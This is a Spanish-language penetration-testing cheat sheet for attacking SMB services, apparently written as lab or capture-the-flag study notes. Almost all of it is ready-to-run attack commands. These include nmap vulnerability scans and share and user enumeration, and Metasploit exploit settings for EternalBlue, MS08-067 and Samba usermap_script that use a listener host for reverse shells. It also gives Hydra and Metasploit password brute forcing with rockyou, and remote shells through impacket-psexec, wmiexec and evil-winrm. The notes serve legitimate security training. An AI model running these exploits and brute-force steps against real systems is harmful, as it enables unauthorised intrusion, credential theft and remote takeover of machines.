# Enumeración y Ataque — SMB (Puertos 139/445)

## Descripción

SMB (Server Message Block) es el protocolo de compartición de archivos e impresoras en redes Windows. Es uno de los vectores más importantes en máquinas Windows y también aparece en Linux via Samba. Tiene vulnerabilidades críticas históricas como EternalBlue.

**Puertos:** 139 (NetBIOS) y 445 (SMB directo)

---

## Paso 1 — Enumeración con Nmap

```shell
nmap -p 139,445 -sV -sC TARGET_IP

# Scripts específicos de SMB
nmap -p 445 --script smb-vuln* TARGET_IP          # Buscar vulnerabilidades conocidas
nmap -p 445 --script smb-enum-shares TARGET_IP    # Listar shares
nmap -p 445 --script smb-enum-users TARGET_IP     # Listar usuarios
```

---

## Paso 2 — Enumeración con smbclient

```shell
# Listar shares disponibles (sin credenciales)
smbclient -L //TARGET_IP -N

# Listar shares con credenciales
smbclient -L //TARGET_IP -U usuario

# Conectar a un share específico
smbclient //TARGET_IP/share_name -N
smbclient //TARGET_IP/share_name -U usuario
```

Dentro de smbclient:
```shell
ls              # Listar archivos
get archivo     # Descargar archivo
put archivo     # Subir archivo
mget *          # Descargar todo
```

---

## Paso 3 — Enumeración con enum4linux

```shell
# Enumeración completa (usuarios, shares, grupos, políticas)
enum4linux -a TARGET_IP
```

Información que devuelve:
- Usuarios del sistema
- Shares disponibles
- Grupos
- Información del dominio
- Política de contraseñas

---

## Paso 4 — Buscar vulnerabilidades conocidas

### EternalBlue — MS17-010 (Windows 7/2008 R2) ⭐

Una de las vulnerabilidades más famosas. Permite RCE sin autenticación.

```shell
# Verificar si es vulnerable
nmap -p 445 --script smb-vuln-ms17-010 TARGET_IP

# Explotar con Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST KALI_IP
run
```

### MS08-067 (Windows XP/2003)

```shell
use exploit/windows/smb/ms08_067_netapi
set RHOSTS TARGET_IP
set LHOST KALI_IP
run
```

### Samba usermap_script (Linux con Samba antiguo)

```shell
use exploit/multi/samba/usermap_script
set RHOSTS TARGET_IP
set LHOST KALI_IP
run
```

---

## Paso 5 — Fuerza bruta de credenciales

```shell
# Con Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS TARGET_IP
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Con Hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://TARGET_IP
```

---

## Paso 6 — Con credenciales válidas

```shell
# Ejecutar comandos remotamente
impacket-psexec usuario:contraseña@TARGET_IP
impacket-wmiexec usuario:contraseña@TARGET_IP

# Conectar con Evil-WinRM (si puerto 5985 abierto)
evil-winrm -i TARGET_IP -u usuario -p contraseña
```

---

## Checklist rápido

```
[ ] nmap --script smb-vuln* → vulnerabilidades conocidas
[ ] smbclient -L -N → listar shares sin credenciales
[ ] enum4linux -a → enumeración completa de usuarios y shares
[ ] MS17-010 si es Windows 7/2008
[ ] MS08-067 si es Windows XP/2003
[ ] Samba usermap_script si es Linux con Samba antiguo
[ ] Fuerza bruta si tienes usuarios válidos
[ ] impacket-psexec si tienes credenciales
```
